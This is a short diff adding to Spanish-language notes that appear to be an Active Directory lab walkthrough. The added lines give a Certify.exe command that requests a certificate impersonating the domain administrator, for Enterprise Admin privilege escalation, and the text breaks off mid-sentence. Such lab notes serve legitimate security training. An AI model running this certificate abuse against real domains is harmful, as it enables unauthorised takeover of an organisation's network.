@@ -1480,3 +1480,10 @@ Ahora ya podemos probar si podemos acceder
 ```shell
 winrs -r:dcorp-dc cmd /c set username
 ```
+
+Ahora para poder escalar privilegios tendremos que solicitar el certificado para el Enterprise Admin
+```shell
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
+```
+
+Guardar el certificado en **
